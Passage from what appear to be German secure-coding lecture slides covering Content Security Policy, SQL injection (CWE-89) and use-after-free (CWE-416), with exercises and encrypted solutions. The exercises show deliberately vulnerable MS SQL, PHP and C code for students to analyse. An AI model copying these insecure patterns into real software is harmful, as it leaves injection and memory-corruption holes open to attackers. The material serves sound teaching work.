<svg viewBox="48 68 1104 396" xmlns="http://www.w3.org/2000/svg">

    <!-- Definition Section -->
    <g id="definition">
        <rect x="50" y="70" width="1100" height="140" fill="#e3f2fd" stroke="#1976d2" stroke-width="2" rx="8"/>
        <text x="70" y="100" font-size="20" font-weight="bold" fill="#1565c0">
        1. Definition der CSP
        </text>

        <!-- HTTP Header -->
        <rect x="70" y="120" width="500" height="70" fill="#fff" stroke="#64b5f6" stroke-width="2" rx="4"/>
        <text x="90" y="145" font-size="16" font-weight="bold" fill="#0d47a1">HTTP Header:</text>
        <text x="90" y="165" font-size="14" font-family="monospace" fill="#424242">
        Content-Security-Policy:
        </text>
        <text x="90" y="183" font-size="14" font-family="monospace" fill="#1976d2">
        default-src 'self'; script-src 'self'
        </text>

        <!-- Meta Tag -->
        <rect x="600" y="120" width="500" height="70" fill="#fff" stroke="#64b5f6" stroke-width="2" rx="4"/>
        <text x="620" y="145" font-size="16" font-weight="bold" fill="#0d47a1">HTML Meta-Tag:</text>
        <text x="620" y="165" font-size="13" font-family="monospace" fill="#424242">
        &lt;meta http-equiv="Content-Security-Policy"
        </text>
        <text x="665" y="183" font-size="13" font-family="monospace" fill="#1976d2">
        content="default-src 'self'"&gt;
        </text>
    </g>

    <!-- Directives Section -->
    <g id="directives">
        <rect x="50" y="240" width="1100" height="220" fill="#fff3e0" stroke="#f57c00" stroke-width="2" rx="8"/>
        <text x="70" y="270" font-size="20" font-weight="bold" fill="#e65100">
        2. Wichtige Direktiven
        </text>

        <!-- Grid of directives -->
        <g id="directive-grid">
        <!-- Row 1 -->
        <rect x="70" y="290" width="250" height="60" fill="#fff" stroke="#ffb74d" stroke-width="2" rx="4"/>
        <text x="85" y="315" font-size="15" font-weight="bold" fill="#e65100">default-src</text>
        <text x="85" y="335" font-size="13" fill="#424242">Fallback für alle Ressourcentypen</text>

        <rect x="340" y="290" width="250" height="60" fill="#fff" stroke="#ffb74d" stroke-width="2" rx="4"/>
        <text x="355" y="315" font-size="15" font-weight="bold" fill="#e65100">script-src</text>
        <text x="355" y="335" font-size="13" fill="#424242">JavaScript-Quellen (inline & extern)</text>

        <rect x="610" y="290" width="250" height="60" fill="#fff" stroke="#ffb74d" stroke-width="2" rx="4"/>
        <text x="625" y="315" font-size="15" font-weight="bold" fill="#e65100">style-src</text>
        <text x="625" y="335" font-size="13" fill="#424242">CSS-Stylesheets und Styles</text>

        <rect x="880" y="290" width="250" height="60" fill="#fff" stroke="#ffb74d" stroke-width="2" rx="4"/>
        <text x="895" y="315" font-size="15" font-weight="bold" fill="#e65100">img-src</text>
        <text x="895" y="335" font-size="13" fill="#424242">Bilder und Favicons</text>

        <!-- Row 2 -->
        <rect x="70" y="370" width="250" height="60" fill="#fff" stroke="#ffb74d" stroke-width="2" rx="4"/>
        <text x="85" y="395" font-size="15" font-weight="bold" fill="#e65100">connect-src</text>
        <text x="85" y="415" font-size="13" fill="#424242">AJAX, WebSocket, fetch()-Verbindungen</text>

        <rect x="340" y="370" width="250" height="60" fill="#fff" stroke="#ffb74d" stroke-width="2" rx="4"/>
        <text x="355" y="395" font-size="15" font-weight="bold" fill="#e65100">font-src</text>
        <text x="355" y="415" font-size="13" fill="#424242">Web Fonts</text>

        <rect x="610" y="370" width="250" height="60" fill="#fff" stroke="#ffb74d" stroke-width="2" rx="4"/>
        <text x="625" y="395" font-size="15" font-weight="bold" fill="#e65100">frame-src</text>
        <text x="625" y="415" font-size="13" fill="#424242">iFrames und eingebettete Inhalte</text>

        <rect x="880" y="370" width="250" height="60" fill="#fff" stroke="#ffb74d" stroke-width="2" rx="4"/>
        <text x="895" y="395" font-size="15" font-weight="bold" fill="#e65100">media-src</text>
        <text x="895" y="415" font-size="13" fill="#424242">Video & Audio</text>
        </g>
    </g>
</svg><aside class="footnote-list brackets">
<aside class="footnote brackets" id="footnote-1" role="doc-footnote">
<span class="label"><span class="fn-bracket">[</span><a role="doc-backlink" href="#footnote-reference-1">1</a><span class="fn-bracket">]</span></span>
<p><span class="peripheral">(Dies löst nicht das Problem, minimiert aber ggf. die Auswirkungen!)</span></p>
</aside>
</aside>
<div class="supplemental docutils container">
<p class="rubric">CSP</p>
<ul>
<li><p>CSP erlaubt die Kontrolle darüber, welche Ressourcen, insbesondere auch JavaScript-Ressourcen, ein Dokument laden darf.</p></li>
<li><p>Auswirkungen &amp; Schutz</p>
<ul class="positive-list">
<li><p>Schutz vor XSS: Blockiert unerlaubte Inline-Scripts und externe Scripts von nicht-vertrauenswürdigen Quellen.</p></li>
<li><p>Data Injection Prevention: Verhindert Einschleusung von bösartigen Inhalten durch strikte Kontrolle erlaubter Ressourcen-Quellen.</p></li>
<li><p>Clickjacking-Schutz: <code class="http"><span class="error">frame-ancestors</span></code> kontrolliert, wo die Seite in Frames eingebettet werden darf.</p>
<pre class="code http literal-block"><code><span class="error">Content-Security-Policy: frame-ancestors 'none'</span></code></pre>
</li>
<li><p>Violation Reporting: <span class="obsolete">report-uri oder</span> report-to: Verstöße werden an definierte Endpunkte gemeldet.</p></li>
<li><p>HTTPS-Erzwingung: <code class="http"><span class="error">Content-Security-Policy: upgrade-insecure-requests</span></code>: HTTP wird automatisch zu HTTPS aufgewertet.</p></li>
</ul>
</li>
<li><p>Empfehlung: Starten Sie mit <code class="http"><span class="error">report-only</span></code> Mode, um Auswirkungen zu testen.</p>
<pre class="code http literal-block"><code><span class="error">Content-Security-Policy-Report-Only: &lt;policy&gt;</span></code></pre>
</li>
</ul>
</div>
</ld-card></ld-deck></ld-topic>
<ld-topic class="new-subsection transition-move-to-top" id="cwe-89-improper-neutralization-of-special-elements-used-in-an-sql-command-sql-injection">
<h2>CWE-89: Improper Neutralization of Special Elements used in an SQL Command (<em>SQL Injection</em>)</h2>
<div class="section-subtitle docutils container">
<p class="rubric">CWE Rank</p>
<table class="booktabs table-data-align-left table-header-align-left" style="width: 100%;">
<colgroup>
<col style="width: 40.0%" />
<col style="width: 60.0%" />
</colgroup>
<thead>
<tr><th class="head"><p>Jahr</p></th>
<th class="head"><p>Position</p></th>
</tr>
</thead>
<tbody>
<tr><td><p>2024</p></td>
<td><p>#3</p></td>
</tr>
<tr><td><p>2023</p></td>
<td><p>#3</p></td>
</tr>
</tbody>
</table>
</div>
</ld-topic>
<ld-topic id="cwe-89-sql-injection">
<h2>CWE-89: <em>SQL Injection</em></h2>
<ld-deck>
<ld-card>
<dl class="field-list simple">
<dt>Kurzbeschreibung<span class="colon">:</span></dt>
<dd><p>Ein SQL-Befehl wird ganz oder teilweise unter Verwendung extern beeinflusster Eingaben von einer vorgelagerten Komponente erzeugt. Dabei werden aber spezielle Elemente nicht oder falsch bereinigt, die den beabsichtigten SQL-Befehl verändern könnten, wenn er an eine nachgelagerte Komponente gesendet wird.</p>
</dd>
<dt>Wahrscheinlichkeit des Missbrauchs<span class="colon">:</span></dt>
<dd><p>Hoch</p>
</dd>
<dt>Technologie<span class="colon">:</span></dt>
<dd><p>Datenbanken</p>
</dd>
<dt>Betrifft<span class="colon">:</span></dt>
<dd><p>Zugriffskontrolle, Vertraulichkeit, Integrität</p>
</dd>
</dl>
</ld-card><ld-card class="incremental">
<div class="ld-exercise" data-exercise-id="9" data-exercise-title="9 - MS SQL" id="ld-exercise-9">
<p class="ld-exercise-title rubric">MS SQL</p>
<pre class="code sql literal-block"><small class="ln">1 </small><code data-lineno="1 "><span class="keyword">SELECT</span><span class="whitespace"> </span><span class="name">ITEM</span><span class="punctuation">,</span><span class="name">PRICE</span><span class="whitespace">
</span></code><small class="ln">2 </small><code data-lineno="2 "><span class="whitespace">    </span><span class="keyword">FROM</span><span class="whitespace"> </span><span class="name">PRODUCT</span><span class="whitespace">
</span></code><small class="ln">3 </small><code data-lineno="3 "><span class="whitespace">    </span><span class="keyword">WHERE</span><span class="whitespace"> </span><span class="name">ITEM_CATEGORY</span><span class="operator">=</span><span class="literal string single">'$user_input'</span><span class="whitespace">
</span></code><small class="ln">4 </small><code data-lineno="4 "><span class="whitespace">    </span><span class="keyword">ORDER</span><span class="whitespace"> </span><span class="keyword">BY</span><span class="whitespace"> </span><span class="name">PRICE</span></code></pre>
<aside class="admonition incremental warning">
<p class="admonition-title">Warnung</p>
<p>MS SQL hat eine eingebaute Funktion, die es erlaubt Shell Befehle auszuführen. Diese Funktion kann auch in einem SQL Statement verwendet werden.</p>
</aside>
<div class="ld-exercise-solution" data-encrypted="true">
MTAwMDAw:XCc1S7qLgmbgEoWOvxXUDSwDbOQL8lhJHhQojhLGGaE=:xWiXHXyVSgjQ0RWL:e/r22gCbGwnfAcYLqR3VCIFBH1pWyXjUOy9yKkb/dpCJ8Dnyi5VWz2knCMJUO/Z7sd4p+uzk2SLSONYLWsAmyAQTqelIwLmrsr7VLFE/XJ45+pUYcynmJHtfKB9aT6/rwohXtbp9heGHjfFv9JR7APaw0dT0FXIsQmfu+mc8a/TuJFBMuEqp7e1zUglPxUWV1j24F6nYKg==</div>
</div>
</ld-card><ld-card class="incremental">
<div class="ld-exercise" data-exercise-id="10" data-exercise-title="10 - PHP" id="ld-exercise-10">
<p class="ld-exercise-title rubric">PHP</p>
<pre class="code php literal-block"><small class="ln">1 </small><code data-lineno="1 "><span class="other">$id = $_COOKIE[&quot;mid&quot;];
</span></code><small class="ln">2 </small><code data-lineno="2 "><span class="other">mysql_query(
</span></code><small class="ln">3 </small><code data-lineno="3 "><span class="other">    &quot;SELECT MessageID, Subject FROM messages WHERE MessageID = '$id'&quot;
</span></code><small class="ln">4 </small><code data-lineno="4 "><span class="other">);</span></code></pre>
<div class="ld-exercise-solution" data-encrypted="true">
MTAwMDAw:h7tcyaOwd3OSqi7O3HVVNvflF/5mPkbuYJB403FP4Bc=:XPXusKURWsMfqmhk:Gbq0EPDTz57cddSAwkLYAeqTAz9oRbEwwHeVWhhhaih4rQYShVbr99FRe2zik3VXXKVmp/Xrbb068h7n/gGet9l/HyuZlaLD+vNPgjLup0mMzOBh+NItXjZttc51jZxXH5SjivIhG7H+V6tmFLPlr51jnZ5kuLFzA8qKBTJRghRRk6SYhiE48JjVDn0rUGmJiuUMZiFZyE3HHd/V1aFvcimSpnN82C/NRatUlZgIZF2FP452ZNKUbmmf8guyvf5MMa5uhdDJXtk/kr2bCKqyIk7L7W14nOjPPCAwz/orsOP91oORukeffnXIhjtwZcuh4Bh300O3bTLZi+Q9n0Ljj3QqQ+nwlFcEA0ZSsnnvD1/ejX06yuzNvJg9RWmSac4Sj1Ah6we288+X+MODU/3XRsUtSFnrFYMhaOfDJ+tuXVgZ5C2tu3OtGkB+u+y23RokRlvtE2PBdfUwxxwCe6sK4gsMRf8PDDu2wV5OTccT2f0Eu4eEYnVqfVEt3t0/SA0r</div>
</div>
</ld-card><ld-card class="incremental">
<p class="rubric">Abhilfemaßnahmen und Erkennung</p>
<ul class="incremental-list list-with-explanations">
<li><p>Verwendung von geprüften/sicheren APIs</p></li>
<li><p>Verwendung von <em>Prepared Statements</em></p></li>
<li><p>Datenbank nur mit den notwendigen Rechten betreiben</p>
<p>(<em>Principle of Least Privilege</em>)</p>
</li>
<li><p>Sollte es notwendig sein einen dynamischen SQL Befehl zu erstellen, dann sollten geprüfte Escapefunktionen verwendet werden</p></li>
<li><p>Statische Analyse Werkzeuge</p></li>
<li><p>ggf. Application-level Firewall einsetzen</p></li>
</ul>
</ld-card></ld-deck></ld-topic>
<ld-topic class="new-subsection transition-move-to-top" id="cwe-416-use-after-free-uaf">
<h2>CWE-416: Use After Free (UAF)</h2>
<div class="section-subtitle docutils container">
<p class="rubric">CWE Rank</p>
<table class="booktabs table-data-align-left table-header-align-left" style="width: 100%;">
<colgroup>
<col style="width: 40.0%" />
<col style="width: 60.0%" />
</colgroup>
<thead>
<tr><th class="head"><p>Jahr</p></th>
<th class="head"><p>Position</p></th>
</tr>
</thead>
<tbody>
<tr><td><p>2024</p></td>
<td><p>#8</p></td>
</tr>
<tr><td><p>2023</p></td>
<td><p>#4</p></td>
</tr>
</tbody>
</table>
</div>
</ld-topic>
<ld-topic id="cwe-416-use-after-free">
<h2>CWE-416: Use After Free</h2>
<ld-deck>
<ld-card>
<dl class="field-list simple">
<dt>Kurzbeschreibung<span class="colon">:</span></dt>
<dd><p>Referenzierung von Speicher nach der Freigabe kann dazu führen, dass ein Programm abstürzt, unerwartete Werte verwendet oder Code ausführt.</p>
</dd>
<dt>Wahrscheinlichkeit des Missbrauchs<span class="colon">:</span></dt>
<dd><p>Hoch</p>
</dd>
<dt>Programmiersprachen<span class="colon">:</span></dt>
<dd><p>C, C++</p>
</dd>
<dt>Betrifft<span class="colon">:</span></dt>
<dd><p>Verfügbarkeit, Vertraulichkeit, Integrität</p>
</dd>
</dl>
</ld-card><ld-card class="incremental">
<aside class="admonition example">
<p class="admonition-title">Beispiel</p>
<pre class="code C literal-block"><small class="ln">1 </small><code data-lineno="1 "><span class="keyword type">char</span><span class="operator">*</span><span class="whitespace"> </span><span class="name">ptr</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="keyword type">char</span><span class="operator">*</span><span class="punctuation">)</span><span class="name">malloc</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="name">SIZE</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln">2 </small><code data-lineno="2 "><span class="whitespace"></span><span class="keyword">if</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="name">err</span><span class="punctuation">)</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace"> </span><span class="name">abrt</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="literal number integer">1</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln">3 </small><code data-lineno="3 "><span class="whitespace">           </span><span class="name">free</span><span class="punctuation">(</span><span class="name">ptr</span><span class="punctuation">);</span><span class="whitespace"> </span><span class="punctuation">}</span></code></pre>
<pre class="code C incremental literal-block"><small class="ln">1 </small><code data-lineno="1 "><span class="comment single">// ... Somewhere else in the code:
</span></code><small class="ln">2 </small><code data-lineno="2 "><span class="comment single"></span><span class="keyword type">char</span><span class="operator">*</span><span class="whitespace"> </span><span class="name">otherPtr</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="keyword type">char</span><span class="operator">*</span><span class="punctuation">)</span><span class="name">malloc</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="name">SIZE</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln">3 </small><code data-lineno="3 "><span class="whitespace"></span><span class="name">otherPtr</span><span class="operator">*</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="operator">&lt;</span><span class="name">HACKER</span><span class="whitespace"> </span><span class="name">CONTROLLED</span><span class="whitespace"> </span><span class="name">VALUE</span><span class="operator">&gt;</span><span class="punctuation">;</span><span class="whitespace"> </span><span class="punctuation">...</span></code></pre>
<pre class="code C incremental literal-block"><small class="ln">1 </small><code data-lineno="1 "><span class="keyword">if</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="name">abrt</span><span class="punctuation">)</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace"> </span><span class="comment single">// Next: use of ptr after free which uses the hacker controlled value
</span></code><small class="ln">2 </small><code data-lineno="2 "><span class="comment single"></span><span class="whitespace">            </span><span class="name">logError</span><span class="punctuation">(</span><span class="literal string">&quot;operation aborted before commit&quot;</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="name">ptr</span><span class="punctuation">);</span><span class="whitespace"> </span><span class="punctuation">}</span></code></pre>
<aside class="admonition hint">
<p class="admonition-title">Hinweis</p>
<p>Ziel ist es im Allgemeinen eine Referenz auf einen interessanten Speicherbereich zu erhalten, der bereits freigegeben wurde und dann den Inhalt dieses Speicherbereichs auszulesen bzw. zu manipulieren, um die nächste Verwendung zu kontrollieren.</p>
</aside>
</aside>
</ld-card><ld-card class="incremental">
<div class="ld-exercise" data-exercise-id="11" data-exercise-title="11 - *Memoryallocation* in C" id="ld-exercise-11">
<p class="ld-exercise-title rubric">*Memoryallocation* in C</p>
<ld-grid class="default-layout">
<ld-cell style="align-self:auto;">
<pre class="code C literal-block"><small class="ln"> 1 </small><code data-lineno=" 1 "><span class="comment preproc">#include</span><span class="whitespace"> </span><span class="comment preprocfile">&lt;stdlib.h&gt;</span><span class="comment preproc">
</span></code><small class="ln"> 2 </small><code data-lineno=" 2 "><span class="comment preproc">#include</span><span class="whitespace"> </span><span class="comment preprocfile">&lt;stdio.h&gt;</span><span class="comment preproc">
</span></code><small class="ln"> 3 </small><code data-lineno=" 3 "><span class="comment preproc">#include</span><span class="whitespace"> </span><span class="comment preprocfile">&lt;string.h&gt;</span><span class="comment preproc">
</span></code><small class="ln"> 4 </small><code data-lineno=" 4 "><span class="comment preproc">#define BUFSIZER1 512
</span></code><small class="ln"> 5 </small><code data-lineno=" 5 "><span class="comment preproc"></span><span class="keyword type">int</span><span class="whitespace"> </span><span class="name function">main</span><span class="punctuation">(</span><span class="keyword type">int</span><span class="whitespace"> </span><span class="name">argc</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="keyword type">char</span><span class="whitespace"> </span><span class="operator">**</span><span class="name">argv</span><span class="punctuation">)</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace">
</span></code><small class="ln"> 6 </small><code data-lineno=" 6 "><span class="whitespace">    </span><span class="keyword type">char</span><span class="whitespace"> </span><span class="operator">*</span><span class="name">buf1R1</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="operator">*</span><span class="name">buf2R1</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="operator">*</span><span class="name">buf2R2</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln"> 7 </small><code data-lineno=" 7 "><span class="whitespace">    </span><span class="name">buf2R1</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="keyword type">char</span><span class="whitespace"> </span><span class="operator">*</span><span class="punctuation">)</span><span class="whitespace"> </span><span class="name">malloc</span><span class="punctuation">(</span><span class="name">BUFSIZER1</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln"> 8 </small><code data-lineno=" 8 "><span class="whitespace">    </span><span class="name">printf</span><span class="punctuation">(</span><span class="literal string">&quot;buf2R1     -&gt; %p</span><span class="literal string escape">\n</span><span class="literal string">&quot;</span><span class="punctuation">,</span><span class="name">buf2R1</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln"> 9 </small><code data-lineno=" 9 "><span class="whitespace">    </span><span class="name">free</span><span class="punctuation">(</span><span class="name">buf2R1</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln">10 </small><code data-lineno="10 "><span class="whitespace">    </span><span class="name">printf</span><span class="punctuation">(</span><span class="literal string">&quot;[FREED]       %p</span><span class="literal string escape">\n</span><span class="literal string">&quot;</span><span class="punctuation">,</span><span class="name">buf2R1</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln">11 </small><code data-lineno="11 "><span class="whitespace">    </span><span class="name">buf2R2</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="keyword type">char</span><span class="whitespace"> </span><span class="operator">*</span><span class="punctuation">)</span><span class="whitespace"> </span><span class="name">malloc</span><span class="punctuation">(</span><span class="name">BUFSIZER1</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln">12 </small><code data-lineno="12 "><span class="whitespace">    </span><span class="name">strncpy</span><span class="punctuation">(</span><span class="name">buf2R2</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="name">argv</span><span class="punctuation">[</span><span class="literal number integer">1</span><span class="punctuation">],</span><span class="whitespace"> </span><span class="name">BUFSIZER1</span><span class="literal number integer">-1</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln">13 </small><code data-lineno="13 "><span class="whitespace">    </span><span class="name">printf</span><span class="punctuation">(</span><span class="literal string">&quot;buf2R2     -&gt; %p</span><span class="literal string escape">\n</span><span class="literal string">&quot;</span><span class="punctuation">,</span><span class="name">buf2R2</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln">14 </small><code data-lineno="14 "><span class="whitespace">    </span><span class="name">printf</span><span class="punctuation">(</span><span class="literal string">&quot;buf2R2     =  %s</span><span class="literal string escape">\n</span><span class="literal string">&quot;</span><span class="punctuation">,</span><span class="name">buf2R2</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln">15 </small><code data-lineno="15 "><span class="whitespace">    </span><span class="name">printf</span><span class="punctuation">(</span><span class="literal string">&quot;!!! buf2R1 =  %s</span><span class="literal string escape">\n</span><span class="literal string">&quot;</span><span class="punctuation">,</span><span class="name">buf2R1</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln">16 </small><code data-lineno="16 "><span class="whitespace">    </span><span class="name">free</span><span class="punctuation">(</span><span class="name">buf2R2</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln">17 </small><code data-lineno="17 "><span class="whitespace"></span><span class="punctuation">}</span></code></pre>
</ld-cell><ld-cell style="align-self:auto;">
<p><strong>Fragen</strong>:</p>
<ol class="arabic simple">
<li><p>Wird dieses Program bis zum Ende laufen oder abstürzen?</p></li>
<li><p>Welche Ausgabe erzeugt das Programm?</p></li>
<li><p>Ist die Ausgabe bei jedem Lauf gleich?</p></li>
</ol>
</ld-cell></ld-grid><div class="ld-exercise-solution" data-encrypted="true">
MTAwMDAw:uJQB2ecWQKmOGBE61qQS8CgKgzKNAe3MlOlZl8ibiOs=:yEqMWPj4AX7EW5Ph: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